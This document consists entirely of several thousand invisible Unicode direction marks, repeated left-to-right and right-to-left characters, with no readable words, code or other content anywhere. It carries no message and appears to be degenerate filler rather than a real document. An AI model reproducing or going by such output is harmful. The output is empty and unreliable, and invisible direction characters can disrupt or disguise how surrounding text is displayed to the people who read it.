‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎